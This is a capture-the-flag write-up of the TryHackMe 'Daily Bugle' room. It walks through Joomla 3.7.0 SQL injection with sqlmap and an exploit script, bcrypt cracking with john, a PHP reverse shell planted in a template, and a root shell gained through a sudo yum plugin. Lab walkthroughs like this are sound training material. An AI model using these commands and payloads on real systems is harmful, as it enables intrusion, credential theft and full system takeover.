---
title: THM{Daily Bugle}
author: Anugrah SR
date: 2020-11-17 01:00:00 +0800
categories: [Boot2root,Tryhackme]
tags: [Brute, tryhackme, nmap, sudo, Joomscan, john, linux, yum, joomla ]
math: true
image: "https://i.imgur.com/H98yNCQ.png"
---
# Daily Bugle
## About The Room
*Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.*<br>
* Url: https://tryhackme.com/room/dailybugle
* Creator: [Tryhackme](https://tryhackme.com/p/tryhackme)
* Difficulty: Hard

## Reconnaissance
### Nmap scan
```bash
nmap -sV -sC -T4 10.10.48.197 -oN nmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-16 10:21 EST
Nmap scan report for 10.10.48.197
Host is up (0.15s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 68:ed:7b:19:7f:ed:14:e6:18:98:6d:c5:88:30:aa:e9 (RSA)
|   256 5c:d6:82:da:b2:19:e3:37:99:fb:96:82:08:70:ee:9d (ECDSA)
|_  256 d2:a9:75:cf:2f:1e:f5:44:4f:0b:13:c2:0f:d7:37:cc (ED25519)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-generator: Joomla! - Open Source Content Management
| http-robots.txt: 15 disallowed entries
| /joomla/administrator/ /administrator/ /bin/ /cache/
| /cli/ /components/ /includes/ /installation/ /language/
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-title: Home
3306/tcp open  mysql   MariaDB (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.56 seconds

```
We have identified two ports
* 22 ssh
* 80 http
* 3306 mysql

## HTTP
![](https://imgur.com/rXcoVY9l.png)

From the `robots.txt` entry `administrator` we will get the idea it's running joomla.

http://10.10.48.197/administrator/
![](https://imgur.com/O9mJh8Vl.png)
Qustion here is what version is it? is there a way we can exploit it?

### Joomscan
You can download from here [Joomscan github](https://github.com/OWASP/joomscan).

```bash
joomscan -u http://10.10.48.197
  ____  _____  _____  __  __  ___   ___    __    _  _
   (_  _)(  _  )(  _  )(  \/  )/ __) / __)  /__\  ( \( )
  .-_)(   )(_)(  )(_)(  )    ( \__ \( (__  /(__)\  )  (
  \____) (_____)(_____)(_/\/\_)(___/ \___)(__)(__)(_)\_)
                        (1337.today)

    --=[OWASP JoomScan
    +---++---==[Version : 0.0.7
    +---++---==[Update Date : [2018/09/23]
    +---++---==[Authors : Mohammad Reza Espargham , Ali Razmjoo
    --=[Code name : Self Challenge
    @OWASP_JoomScan , @rezesp , @Ali_Razmjo0 , @OWASP

Processing http://10.10.48.197 ...
[+] FireWall Detector
[++] Firewall not detected

[+] Detecting Joomla Version
[++] Joomla 3.7.0

[+] Core Joomla Vulnerability
[++] Target Joomla core is not vulnerable

[+] Checking Directory Listing                                                             ...                                                                
```
We now know it's running Joomla 3.7.0, let's see if there are any exploits using `searchsploit`
### Searchsploit
![](https://imgur.com/MmheHb2l.png)
```
sqlmap -u "http://10.10.48.197/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --random-agent --dbs -p list[fullordering] --threads 10 -D joomla -T "#__users" --dump
```
**Instead of using SQLMap, why not use a python script!**
Okey! Let's google and find that python script.
### Joombhla
I found a python script [Joombhla](https://github.com/XiphosResearch/exploits/tree/3950e7618b1920b3d7d34ec6f72f4c0736d010d7/Joomblah)
`python3 joomblah_py3.py http://10.10.48.197`
![](https://imgur.com/eNUq1UXl.png)

```
Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
```
We have Super User `jonah` with encrypted password `$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm`
Let's crack it using john

### John
```bash
john -format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash

Created directory: /root/.john
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

sxxxxxxxxx3     (?)
1g 0:00:12:38 DONE (2020-11-16 12:12) 0.001318g/s 61.76p/s 61.76c/s 61.76C/s thelma1..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
## Gaining Shell
Login in to http://10.10.48.197/administrator/
Using username: `jonah` and password: `sxxxxxxxxx3`
![](https://imgur.com/AZcS1sBl.png)
Go to  `templates`, edit the index.php with reverse php shell
for more details visit this [site](https://www.hackingarticles.in/joomla-reverse-shell/)
![](https://imgur.com/7Xh0voT.png)
Now, activate netcat to get a session with the following command :
```
nc -nlvp 1234
```
![](https://imgur.com/qkUgMgVl.png)
### Full TTYs
```python
python -c 'import pty; pty.spawn("/bin/bash")'
```

Inside the nc session Press `CTRL+Z` and add the following lines.
```bash
stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
I tried `sudo -l`, `crontab` found nothing.
It was time for [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
### linPEAS
This looks interesting!
![](https://imgur.com/H5r0le9l.png)
I looked in `configuration.php` and found
![](https://imgur.com/f1d7Q1jl.png)

Looks like we have some kind of password
```
        public $password = 'nv5uz9r3ZEDzVjNu';
        public $secret = 'UAMBRWzHO3oFPmVC';
```
## Local privilege escalation
One of the password worked :]
```bash
bash-4.2$ cd home/
bash-4.2$ ls
jjameson
bash-4.2$ su jjameson
Password:
[jjameson@dailybugle home]$
```
### User flag
```bash
[jjameson@dailybugle home]$ ls
jjameson
[jjameson@dailybugle home]$ cd jjameson/
[jjameson@dailybugle ~]$ ls
user.txt
[jjameson@dailybugle ~]$ cat user.txt
27a26xxxxxxxxxxxxxxxd80442e
```
## Privilege escalation
```bash
[jjameson@dailybugle ~]$ sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```
Let's see what [gtfobin](https://gtfobins.github.io) have to say about `yum`
![](https://imgur.com/nbhGJxql.png)


Spawn interactive root shell by loading a custom plugin.
```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```
### Root Flag
```bash
sh-4.2# whoami
root
sh-4.2# cat root/root.txt
eecxxxxxxxxxxxxxxxxxxf79
sh-4.2#
```
Congratulations! We have completed the room!
